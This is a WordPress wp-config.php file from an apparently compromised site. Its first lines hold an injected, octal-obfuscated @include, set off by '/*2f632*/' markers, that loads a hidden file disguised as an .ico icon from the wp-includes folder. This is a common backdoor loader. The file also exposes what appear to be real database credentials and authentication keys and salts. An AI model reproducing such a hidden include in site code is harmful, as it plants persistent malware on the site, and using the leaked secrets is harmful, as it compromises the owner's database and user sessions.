<?php
/*2f632*/

@include "\057ho\155e/\141cs\142od\141/p\165bl\151c_\150tm\154/w\160-i\156cl\165de\163/S\151mp\154eP\151e/\110TT\120/.\0627a\06634\0644.\151co";

/*2f632*/
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'acsboda_acs' );

/** MySQL database username */
define( 'DB_USER', 'acsboda_acs' );

/** MySQL database password */
define( 'DB_PASSWORD', 'pEpS2288!.' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'bua2p2mhqgdkms4bvwn1ujst8v9rkwc3lvkzepdtlfv3epubzhefdp0ccjbpfqkn' );
define( 'SECURE_AUTH_KEY',  'jcpn0wjhsepxtsp3ehveyz6eefttsk6firbmihofxiesvntjvzc6i75h24zuo9pb' );
define( 'LOGGED_IN_KEY',    '42du8yiwrbrt7opvw4op84cvyw37gmwgiu6holbm3yf8aprux6je9jwnhuomxvod' );
define( 'NONCE_KEY',        'c26znzqvsnpkzoyrkkyulyx8uxlwgibl0al7wptaggbzbe9l9f3uz9bjtu1l9bvj' );
define( 'AUTH_SALT',        'kxwri7p5mii7edinitikfoqyhfezniithojrtfymwqbwpnle7uycmteixh3yddie' );
define( 'SECURE_AUTH_SALT', 'vbja8wbyekmufvqbzybqnbff752ptdpthynw7dmvtmnfo1pkp1aoptmrhqd0lgzj' );
define( 'LOGGED_IN_SALT',   'zxpwbgij2tbtbhkzxyk01z42wfg7tvwrbrcwjvbp0m6yw57vsff3adzhfyprvmxo' );
define( 'NONCE_SALT',       'rgjpw4sil91fclqbqe8ps9g1ayo7upf4dcluhinwogf1wvfjh1wokok5epnvtjch' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wpob_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', dirname( __FILE__ ) . '/' );
}

/** Sets up WordPress vars and included files. */
require_once( ABSPATH . 'wp-settings.php' );
